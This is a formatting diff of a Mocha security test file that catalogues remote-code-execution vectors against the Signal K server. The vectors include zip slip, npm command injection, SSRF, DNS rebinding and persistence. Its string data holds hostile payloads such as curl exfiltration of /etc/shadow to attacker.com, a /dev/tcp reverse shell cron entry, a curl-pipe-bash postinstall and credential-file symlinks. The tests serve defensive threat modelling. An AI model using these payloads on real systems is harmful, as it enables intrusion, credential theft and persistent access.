@@ -8,17 +8,16 @@
  * Attack Model: External attacker with network access (no auth initially)
  */
 
-const { describe, it, before, after } = require('mocha');
-const { expect } = require('chai');
+const { describe, it, before, after } = require('mocha')
+const { expect } = require('chai')
 
-describe('External Attacker RCE & Remote Exploitation', function() {
-  this.timeout(30000);
+describe('External Attacker RCE & Remote Exploitation', function () {
+  this.timeout(30000)
 
   // ==================== ZIP SLIP ATTACKS ====================
 
-  describe('Zip Slip Path Traversal in Backup Restore', function() {
-
-    it('should test zip file with path traversal entries', function() {
+  describe('Zip Slip Path Traversal in Backup Restore', function () {
+    it('should test zip file with path traversal entries', function () {
       /**
        * CRITICAL VULNERABILITY: Zip Slip
        * File: src/serverroutes.ts lines 1101, 1114
@@ -45,7 +44,8 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         },
         {
           entry: '../../../tmp/malicious.sh',
-          content: '#!/bin/bash\ncurl attacker.com/exfil?data=$(cat /etc/shadow | base64)'
+          content:
+            '#!/bin/bash\ncurl attacker.com/exfil?data=$(cat /etc/shadow | base64)'
         },
         {
           entry: '..\\..\\..\\..\\windows\\system32\\tasks\\malicious',
@@ -53,16 +53,17 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         },
         {
           entry: '../node_modules/@signalk/server-admin-ui/public/malicious.js',
-          content: 'document.write("<script src=http://attacker.com/steal.js></script>")'
+          content:
+            'document.write("<script src=http://attacker.com/steal.js></script>")'
         }
-      ];
+      ]
 
-      zipSlipPayloads.forEach(payload => {
-        expect(payload.entry).to.include('..');
-      });
-    });
+      zipSlipPayloads.forEach((payload) => {
+        expect(payload.entry).to.include('..')
+      })
+    })
 
-    it('should test zip file with symlink entries for arbitrary read', function() {
+    it('should test zip file with symlink entries for arbitrary read', function () {
       /**
        * Attack: Zip contains symlinks pointing to sensitive files
        * When extracted, symlinks are followed for reads
@@ -71,15 +72,15 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         { name: 'settings.json', target: '/etc/shadow' },
         { name: 'defaults.json', target: '/root/.ssh/id_rsa' },
         { name: 'security.json', target: '../security.json' }, // Circular
-        { name: 'package.json', target: '/proc/self/environ' },
-      ];
+        { name: 'package.json', target: '/proc/self/environ' }
+      ]
 
-      symlinkPayloads.forEach(payload => {
-        expect(payload.target).to.be.a('string');
-      });
-    });
+      symlinkPayloads.forEach((payload) => {
+        expect(payload.target).to.be.a('string')
+      })
+    })
 
-    it('should test backup zip bomb (DoS)', function() {
+    it('should test backup zip bomb (DoS)', function () {
       /**
        * Attack: Zip bomb causes disk exhaustion
        * A 42KB zip can expand to 4.5 petabytes
@@ -87,14 +88,14 @@ describe('External Attacker RCE & Remote Exploitation', function() {
       const zipBombCharacteristics = {
         compressedSize: '42KB',
         expandedSize: '4.5PB',
-        compressionRatio: 100000000000,
+        compressionRatio: 100000000000
         // Nested zip-of-zips is most effective
-      };
+      }
 
-      expect(zipBombCharacteristics.compressionRatio).to.be.above(1000);
-    });
+      expect(zipBombCharacteristics.compressionRatio).to.be.above(1000)
+    })
 
-    it('should test ncp directory copy without symlink handling', function() {
+    it('should test ncp directory copy without symlink handling', function () {
       /**
        * File: src/serverroutes.ts lines 1034-1045
        *
@@ -106,17 +107,16 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         source: '/tmp/restore/settings.json -> /etc/passwd',
         destination: '/signalk/config/settings.json',
         risk: 'Symlink followed, /etc/passwd content copied'
-      };
+      }
 
-      expect(ncpVulnerability.source).to.include('->');
-    });
-  });
+      expect(ncpVulnerability.source).to.include('->')
+    })
+  })
 
   // ==================== COMMAND INJECTION ====================
 
-  describe('Command Injection via Package Names', function() {
-
-    it('should test npm install command injection on Windows', function() {
+  describe('Command Injection via Package Names', function () {
+    it('should test npm install command injection on Windows', function () {
       /**
        * CRITICAL: Windows command injection
        * File: src/modules.ts lines 193, 201-203
@@ -132,16 +132,16 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         'legit-package | net user attacker P@ss /add',
         'legit-package && powershell -e <base64_payload>',
         'legit-package; curl attacker.com/shell.ps1 | iex',
-        'legit-package` whoami`',  // Backtick substitution
-        'legit-package$(whoami)',   // May not work on cmd but try
-      ];
+        'legit-package` whoami`', // Backtick substitution
+        'legit-package$(whoami)' // May not work on cmd but try
+      ]
 
-      windowsCmdInjection.forEach(payload => {
-        expect(payload).to.include('legit-package');
-      });
-    });
+      windowsCmdInjection.forEach((payload) => {
+        expect(payload).to.include('legit-package')
+      })
+    })
 
-    it('should test signalk-server module global install escalation', function() {
+    it('should test signalk-server module global install escalation', function () {
       /**
        * File: src/modules.ts lines 191-196, 224-226
        *
@@ -153,14 +153,15 @@ describe('External Attacker RCE & Remote Exploitation', function() {
        */
       const serverModuleAttack = {
         legitimateName: 'signalk-server',
-        attackVector: 'Restore backup with modified package.json where name="signalk-server"',
+        attackVector:
+          'Restore backup with modified package.json where name="signalk-server"',
         result: 'npm runs with sudo/global, bypasses --ignore-scripts'
-      };
+      }
 
-      expect(serverModuleAttack.attackVector).to.include('backup');
-    });
+      expect(serverModuleAttack.attackVector).to.include('backup')
+    })
 
-    it('should test package version injection', function() {
+    it('should test package version injection', function () {
       /**
        * File: src/modules.ts lines 183-184
        *
@@ -172,20 +173,19 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         '1.0.0 --ignore-scripts=false',
         '1.0.0; curl attacker.com',
         '1.0.0 --registry http://evil.com',
-        '$(whoami)',
-      ];
+        '$(whoami)'
+      ]
 
-      versionInjection.forEach(version => {
-        expect(version).to.be.a('string');
-      });
-    });
-  });
+      versionInjection.forEach((version) => {
+        expect(version).to.be.a('string')
+      })
+    })
+  })
 
   // ==================== DYNAMIC REQUIRE/IMPORT ====================
 
-  describe('Dynamic Require/Import Injection', function() {
-
-    it('should test interfaces/index.js dynamic require', function() {
+  describe('Dynamic Require/Import Injection', function () {
+    it('should test interfaces/index.js dynamic require', function () {
       /**
        * File: src/interfaces/index.js lines 1-8
        *
@@ -209,12 +209,12 @@ describe('External Attacker RCE & Remote Exploitation', function() {
           module.exports = { start: () => {} };
         `,
         trigger: 'Server restart'
-      };
+      }
 
-      expect(dynamicRequireAttack.targetDir).to.include('interfaces');
-    });
+      expect(dynamicRequireAttack.targetDir).to.include('interfaces')
+    })
 
-    it('should test plugin directory traversal', function() {
+    it('should test plugin directory traversal', function () {
       /**
        * File: src/interfaces/plugins.ts line 99
        *
@@ -227,15 +227,15 @@ describe('External Attacker RCE & Remote Exploitation', function() {
       const pluginPathTraversal = [
         '../../../tmp/malicious-plugin',
         '../attacker-plugin',
-        '..\\..\\..\\windows\\temp\\malicious',
-      ];
+        '..\\..\\..\\windows\\temp\\malicious'
+      ]
 
-      pluginPathTraversal.forEach(path => {
-        expect(path).to.include('..');
-      });
-    });
+      pluginPathTraversal.forEach((path) => {
+        expect(path).to.include('..')
+      })
+    })
 
-    it('should test importOrRequire with attacker-controlled path', function() {
+    it('should test importOrRequire with attacker-controlled path', function () {
       /**
        * File: src/modules.ts lines 354-375
        *
@@ -249,17 +249,16 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         step2: 'Restore selects node_modules',
         step3: 'importOrRequire loads attacker module',
         result: 'RCE on next plugin load'
-      };
+      }
 
-      expect(moduleInjection.step1).to.include('backup');
-    });
-  });
+      expect(moduleInjection.step1).to.include('backup')
+    })
+  })
 
   // ==================== PLAYGROUND INPUT INJECTION ====================
 
-  describe('Playground API Injection', function() {
-
-    it('should test inputTest endpoint delta injection', function() {
+  describe('Playground API Injection', function () {
+    it('should test inputTest endpoint delta injection', function () {
       /**
        * File: src/interfaces/playground.js lines 104-220
        *
@@ -270,24 +269,30 @@ describe('External Attacker RCE & Remote Exploitation', function() {
       const playgroundInjection = {
         endpoint: '/skServer/inputTest',
         body: {
-          value: JSON.stringify([{
-            context: 'vessels.self',
-            updates: [{
-              values: [{
-                path: '__proto__.polluted',
-                value: true
-              }]
-            }]
-          }]),
+          value: JSON.stringify([
+            {
+              context: 'vessels.self',
+              updates: [
+                {
+                  values: [
+                    {
+                      path: '__proto__.polluted',
+                      value: true
+                    }
+                  ]
+                }
+              ]
+            }
+          ]),
           sendToServer: true
         },
         risk: 'Prototype pollution via delta injection'
-      };
+      }
 
-      expect(playgroundInjection.body.sendToServer).to.be.true;
-    });
+      expect(playgroundInjection.body.sendToServer).to.be.true
+    })
 
-    it('should test N2K output injection', function() {
+    it('should test N2K output injection', function () {
       /**
        * File: src/interfaces/playground.js lines 188-193
        *
@@ -297,49 +302,52 @@ describe('External Attacker RCE & Remote Exploitation', function() {
       const n2kInjection = {
         endpoint: '/skServer/inputTest',
         body: {
-          value: JSON.stringify([{
-            pgn: 127489,  // Engine parameters
-            dst: 255,     // Broadcast
-            prio: 2,
-            fields: {
-              'Engine Instance': 0,
-              'Speed': 65535  // Invalid/dangerous value
+          value: JSON.stringify([
+            {
+              pgn: 127489, // Engine parameters
+              dst: 255, // Broadcast
+              prio: 2,
+              fields: {
+                'Engine Instance': 0,
+                Speed: 65535 // Invalid/dangerous value
+              }
             }
-          }]),
+          ]),
           sendToN2K: true
         },
         risk: 'Physical equipment damage or dangerous operation'
-      };
+      }
 
-      expect(n2kInjection.body.sendToN2K).to.be.true;
-    });
+      expect(n2kInjection.body.sendToN2K).to.be.true
+    })
 
-    it('should test PUT path injection via playground', function() {
+    it('should test PUT path injection via playground', function () {
       /**
        * File: src/interfaces/playground.js lines 131-175
        *
        * PUT messages processed with putPath/deletePath
        */
       const putInjection = {
-        value: JSON.stringify([{
-          context: 'vessels.self',
-          put: {
-            path: '__proto__.isAdmin',
-            value: true
+        value: JSON.stringify([
+          {
+            context: 'vessels.self',
+            put: {
+              path: '__proto__.isAdmin',
+              value: true
+            }
           }
-        }]),
+        ]),
         sendToServer: true
-      };
+      }
 
-      expect(putInjection.value).to.include('__proto__');
-    });
-  });
+      expect(putInjection.value).to.include('__proto__')
+    })
+  })
 
   // ==================== NPM REGISTRY ATTACKS ====================
 
-  describe('NPM Registry & Package Attacks', function() {
-
-    it('should test typosquatting via npm search', function() {
+  describe('NPM Registry & Package Attacks', function () {
+    it('should test typosquatting via npm search', function () {
       /**
        * File: src/modules.ts lines 267-291
        *
@@ -352,17 +360,17 @@ describe('External Attacker RCE & Remote Exploitation', function() {
           'signalk-server1',
           'signalk_server',
           'signa1k-server',
-          'signalk-servrr',
+          'signalk-servrr'
         ],
         attackVector: 'Publish to npm with signalk-plugin keyword'
-      };
+      }
 
-      typosquatAttack.typosquatOptions.forEach(name => {
-        expect(name).to.not.equal('signalk-server');
-      });
-    });
+      typosquatAttack.typosquatOptions.forEach((name) => {
+        expect(name).to.not.equal('signalk-server')
+      })
+    })
 
-    it('should test npm registry MITM', function() {
+    it('should test npm registry MITM', function () {
       /**
        * Attack: MITM npm registry traffic to inject malicious packages
        *
@@ -375,12 +383,12 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         attackVector: 'Restore backup with malicious .npmrc',
         maliciousNpmrc: 'registry=http://attacker.com/npm/',
         result: 'All npm installs fetch from attacker'
-      };
+      }
 
-      expect(registryMitm.maliciousNpmrc).to.include('http://');
-    });
+      expect(registryMitm.maliciousNpmrc).to.include('http://')
+    })
 
-    it('should test package.json dependency injection', function() {
+    it('should test package.json dependency injection', function () {
       /**
        * Restore backup with modified package.json containing:
        * - Malicious dependencies
@@ -396,12 +404,14 @@ describe('External Attacker RCE & Remote Exploitation', function() {
             postinstall: 'curl attacker.com/shell.sh | bash'
           }
         }
-      };
+      }
 
-      expect(packageJsonInjection.maliciousPackage.scripts).to.have.property('postinstall');
-    });
+      expect(packageJsonInjection.maliciousPackage.scripts).to.have.property(
+        'postinstall'
+      )
+    })
 
-    it('should test restoreModules execution', function() {
+    it('should test restoreModules execution', function () {
       /**
        * File: src/modules.ts lines 160-177
        *
@@ -409,21 +419,21 @@ describe('External Attacker RCE & Remote Exploitation', function() {
        * This executes any scripts in package.json
        */
       const restoreModulesRisk = {
-        trigger: 'POST /signalk/v1/api/server/restore with package.json selected',
+        trigger:
+          'POST /signalk/v1/api/server/restore with package.json selected',
         action: 'npm install runs in configPath',
         // Note: --ignore-scripts only on individual module install, not restore
         risk: 'postinstall scripts execute'
-      };
+      }
 
-      expect(restoreModulesRisk.trigger).to.include('restore');
-    });
-  });
+      expect(restoreModulesRisk.trigger).to.include('restore')
+    })
+  })
 
   // ==================== SSRF TO RCE ====================
 
-  describe('SSRF to Internal Service Exploitation', function() {
-
-    it('should test SSRF via provider configuration', function() {
+  describe('SSRF to Internal Service Exploitation', function () {
+    it('should test SSRF via provider configuration', function () {
       /**
        * TCP/UDP providers connect to user-specified hosts
        * SSRF can access internal services
@@ -436,15 +446,15 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         { host: '169.254.169.254', port: 80, service: 'AWS Metadata' },
         { host: 'metadata.google.internal', port: 80, service: 'GCP Metadata' },
         { host: '127.0.0.1', port: 2375, service: 'Docker API (RCE!)' },
-        { host: '127.0.0.1', port: 10250, service: 'Kubelet API (RCE!)' },
-      ];
+        { host: '127.0.0.1', port: 10250, service: 'Kubelet API (RCE!)' }
+      ]
 
-      ssrfTargets.forEach(target => {
-        expect(target.port).to.be.a('number');
-      });
-    });
+      ssrfTargets.forEach((target) => {
+        expect(target.port).to.be.a('number')
+      })
+    })
 
-    it('should test Docker socket SSRF RCE', function() {
+    it('should test Docker socket SSRF RCE', function () {
       /**
        * If SignalK runs in Docker with socket mounted,
        * SSRF to Docker API = RCE on host
@@ -458,12 +468,12 @@ describe('External Attacker RCE & Remote Exploitation', function() {
           Binds: ['/:/host']
         },
         result: 'Container with host filesystem access'
-      };
+      }
 
-      expect(dockerRce.body.Binds[0]).to.equal('/:/host');
-    });
+      expect(dockerRce.body.Binds[0]).to.equal('/:/host')
+    })
 
-    it('should test cloud metadata service exploitation', function() {
+    it('should test cloud metadata service exploitation', function () {
       /**
        * Cloud metadata services expose credentials without auth
        */
@@ -472,17 +482,16 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         gcp: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
         azure: 'http://169.254.169.254/metadata/identity/oauth2/token',
         risk: 'Stolen cloud credentials allow further attacks'
-      };
+      }
 
-      expect(cloudMetadata.aws).to.include('169.254.169.254');
-    });
-  });
+      expect(cloudMetadata.aws).to.include('169.254.169.254')
+    })
+  })
 
   // ==================== UDP BROADCAST ATTACKS ====================
 
-  describe('UDP Broadcast/Multicast Exploitation', function() {
-
-    it('should test discovery UDP injection from network', function() {
+  describe('UDP Broadcast/Multicast Exploitation', function () {
+    it('should test discovery UDP injection from network', function () {
       /**
        * File: src/discovery.js lines 84-150
        *
@@ -490,18 +499,18 @@ describe('External Attacker RCE & Remote Exploitation', function() {
        */
       const udpInjection = {
         broadcast: true,
-        port: 2052,  // GoFree discovery
+        port: 2052, // GoFree discovery
         payload: JSON.stringify({
-          IP: '169.254.169.254',  // AWS metadata
-          Port: 80,
+          IP: '169.254.169.254', // AWS metadata
+          Port: 80
           // Server will connect to this as NMEA source
         })
-      };
+      }
 
-      expect(udpInjection.payload).to.include('169.254.169.254');
-    });
+      expect(udpInjection.payload).to.include('169.254.169.254')
+    })
 
-    it('should test mDNS service injection', function() {
+    it('should test mDNS service injection', function () {
       /**
        * mDNS allows advertising fake services
        *
@@ -516,12 +525,12 @@ describe('External Attacker RCE & Remote Exploitation', function() {
           self: 'urn:mrn:signalk:uuid:fake'
         },
         risk: 'Clients connect to attacker server'
-      };
+      }
 
-      expect(mdnsInjection.service).to.include('signalk');
-    });
+      expect(mdnsInjection.service).to.include('signalk')
+    })
 
-    it('should test NMEA TCP injection from LAN', function() {
+    it('should test NMEA TCP injection from LAN', function () {
       /**
        * Port 10110 accepts NMEA without auth
        * Attacker on same network can inject sentences
@@ -531,19 +540,18 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         sentences: [
           '$GPGGA,000000,0000.000,N,00000.000,E,0,00,0.0,0,M,0,M,,*66', // False GPS
           '$GPRMB,A,0.00,R,START,DEST,0000.000,N,00000.000,W,0.0,0.0,0.0,V*6F', // False nav
-          'A'.repeat(10000), // Buffer overflow attempt
+          'A'.repeat(10000) // Buffer overflow attempt
         ]
-      };
+      }
 
-      expect(nmeaInjection.port).to.equal(10110);
-    });
-  });
+      expect(nmeaInjection.port).to.equal(10110)
+    })
+  })
 
   // ==================== WEBSOCKET EXPLOITATION ====================
 
-  describe('WebSocket Remote Exploitation', function() {
-
-    it('should test WebSocket message size limit bypass', function() {
+  describe('WebSocket Remote Exploitation', function () {
+    it('should test WebSocket message size limit bypass', function () {
       /**
        * Large WebSocket messages could cause memory exhaustion
        */
@@ -551,12 +559,12 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         messageSize: 100 * 1024 * 1024, // 100MB
         messageType: 'delta',
         risk: 'Memory exhaustion, server crash'
-      };
+      }
 
-      expect(wsDoS.messageSize).to.be.above(1024 * 1024);
-    });
+      expect(wsDoS.messageSize).to.be.above(1024 * 1024)
+    })
 
-    it('should test WebSocket subscription flooding', function() {
+    it('should test WebSocket subscription flooding', function () {
       /**
        * Many subscriptions could exhaust server resources
        */
@@ -565,12 +573,12 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         connections: 100,
         totalSubscriptions: 1000000,
         risk: 'CPU/memory exhaustion'
-      };
+      }
 
-      expect(subscriptionFlood.totalSubscriptions).to.equal(1000000);
-    });
+      expect(subscriptionFlood.totalSubscriptions).to.equal(1000000)
+    })
 
-    it('should test delta replay attack', function() {
+    it('should test delta replay attack', function () {
       /**
        * Capture and replay deltas to spoof data
        * No sequence numbers or MACs on messages
@@ -580,17 +588,16 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         step2: 'Modify timestamp/values',
         step3: 'Replay to server',
         risk: 'Spoofed position, sensor data'
-      };
+      }
 
-      expect(replayAttack.step3).to.include('Replay');
-    });
-  });
+      expect(replayAttack.step3).to.include('Replay')
+    })
+  })
 
   // ==================== AUTHENTICATION BYPASS ====================
 
-  describe('Authentication Bypass for RCE', function() {
-
-    it('should test admin endpoint access via TCP port', function() {
+  describe('Authentication Bypass for RCE', function () {
+    it('should test admin endpoint access via TCP port', function () {
       /**
        * TCP port 8375 has NO authentication
        * Can it send PUT/POST requests?
@@ -599,30 +606,31 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         port: 8375,
         messages: [
           { put: { path: 'electrical.switches.bank.0.state', value: 1 } },
-          { delete: { path: 'navigation.position' } },
+          { delete: { path: 'navigation.position' } }
         ],
         risk: 'Control vessel systems without auth'
-      };
+      }
 
-      expect(tcpAuthBypass.port).to.equal(8375);
-    });
+      expect(tcpAuthBypass.port).to.equal(8375)
+    })
 
-    it('should test CORS bypass for admin actions', function() {
+    it('should test CORS bypass for admin actions', function () {
       /**
        * If CORS allows *, attacker page can make admin requests
        */
       const corsExploit = {
         attackerPage: 'http://evil.com/attack.html',
-        targetEndpoint: 'http://boat.local:3000/signalk/v1/api/server/plugins/install',
+        targetEndpoint:
+          'http://boat.local:3000/signalk/v1/api/server/plugins/install',
         method: 'POST',
         body: { name: 'malicious-plugin' },
         risk: 'Browser-based attack installs malicious plugin'
-      };
+      }
 
-      expect(corsExploit.attackerPage).to.include('evil.com');
-    });
+      expect(corsExploit.attackerPage).to.include('evil.com')
+    })
 
-    it('should test DNS rebinding attack chain', function() {
+    it('should test DNS rebinding attack chain', function () {
       /**
        * DNS rebinding allows external attacker to access internal SignalK
        *
@@ -634,26 +642,25 @@ describe('External Attacker RCE & Remote Exploitation', function() {
        */
       const dnsRebinding = {
         domain: 'attacker.com',
-        phase1Ip: '1.2.3.4',  // Attacker server
-        phase2Ip: '192.168.1.100',  // Victim SignalK
-        ttl: 0,  // Force re-resolution
+        phase1Ip: '1.2.3.4', // Attacker server
+        phase2Ip: '192.168.1.100', // Victim SignalK
+        ttl: 0, // Force re-resolution
         actions: [
           'Read all vessel data',
           'Install malicious plugin',
           'Restart server',
           'Modify security config'
         ]
-      };
+      }
 
-      expect(dnsRebinding.phase2Ip).to.include('192.168');
-    });
-  });
+      expect(dnsRebinding.phase2Ip).to.include('192.168')
+    })
+  })
 
   // ==================== FILE WRITE TO RCE ====================
 
-  describe('Arbitrary File Write to RCE', function() {
-
-    it('should test security.json overwrite', function() {
+  describe('Arbitrary File Write to RCE', function () {
+    it('should test security.json overwrite', function () {
       /**
        * security.json contains admin credentials
        * Overwriting it could:
@@ -674,12 +681,12 @@ describe('External Attacker RCE & Remote Exploitation', function() {
           acls: [],
           allowNewUserRegistration: true
         }
-      };
+      }
 
-      expect(securityOverwrite.content.users[0].type).to.equal('admin');
-    });
+      expect(securityOverwrite.content.users[0].type).to.equal('admin')
+    })
 
-    it('should test settings.json plugin injection', function() {
+    it('should test settings.json plugin injection', function () {
       /**
        * settings.json enables/configures plugins
        * Could enable malicious plugin or misconfigure security
@@ -688,7 +695,7 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         file: 'settings.json',
         content: {
           security: {
-            enabled: false  // Disable all security!
+            enabled: false // Disable all security!
           },
           plugins: {
             'malicious-plugin': {
@@ -697,25 +704,26 @@ describe('External Attacker RCE & Remote Exploitation', function() {
             }
           }
         }
-      };
+      }
 
-      expect(settingsOverwrite.content.security.enabled).to.be.false;
-    });
+      expect(settingsOverwrite.content.security.enabled).to.be.false
+    })
 
-    it('should test cron job injection via backup restore', function() {
+    it('should test cron job injection via backup restore', function () {
       /**
        * If zip slip works, write to /etc/cron.d/ for persistence
        */
       const cronInjection = {
         zipEntry: '../../../etc/cron.d/signalk-backdoor',
-        content: '* * * * * root bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',
+        content:
+          '* * * * * root bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',
         result: 'Reverse shell every minute'
-      };
+      }
 
-      expect(cronInjection.zipEntry).to.include('cron.d');
-    });
+      expect(cronInjection.zipEntry).to.include('cron.d')
+    })
 
-    it('should test SSH authorized_keys injection', function() {
+    it('should test SSH authorized_keys injection', function () {
       /**
        * Write attacker SSH key for persistent access
        */
@@ -723,16 +731,16 @@ describe('External Attacker RCE & Remote Exploitation', function() {
         zipEntry: '../../../root/.ssh/authorized_keys',
         content: 'ssh-rsa AAAA... attacker@evil.com',
         result: 'SSH access to server as root'
-      };
+      }
 
-      expect(sshInjection.result).to.include('root');
-    });
-  });
+      expect(sshInjection.result).to.include('root')
+    })
+  })
 
   // ==================== SUMMARY ====================
 
-  describe('External Attacker RCE Test Summary', function() {
-    it('should document all RCE vectors tested', function() {
+  describe('External Attacker RCE Test Summary', function () {
+    it('should document all RCE vectors tested', function () {
       const rceVectors = {
         'Zip Slip Attacks': [
           'Path traversal in zip entries',
@@ -787,22 +795,22 @@ describe('External Attacker RCE & Remote Exploitation', function() {
           'Cron job persistence',
           'SSH key injection'
         ]
-      };
+      }
 
-      let totalVectors = 0;
-      Object.values(rceVectors).forEach(vectors => {
-        totalVectors += vectors.length;
-      });
+      let totalVectors = 0
+      Object.values(rceVectors).forEach((vectors) => {
+        totalVectors += vectors.length
+      })
 
-      console.log('\n  ========================================');
-      console.log('  External Attacker RCE Test Summary');
-      console.log('  ========================================');
-      console.log(`  Total Categories: ${Object.keys(rceVectors).length}`);
-      console.log(`  Total RCE Vectors: ${totalVectors}`);
-      console.log('  ========================================\n');
+      console.log('\n  ========================================')
+      console.log('  External Attacker RCE Test Summary')
+      console.log('  ========================================')
+      console.log(`  Total Categories: ${Object.keys(rceVectors).length}`)
+      console.log(`  Total RCE Vectors: ${totalVectors}`)
+      console.log('  ========================================\n')
 
-      expect(Object.keys(rceVectors).length).to.equal(10);
-      expect(totalVectors).to.equal(34);
-    });
-  });
-});
+      expect(Object.keys(rceVectors).length).to.equal(10)
+      expect(totalVectors).to.equal(34)
+    })
+  })
+})
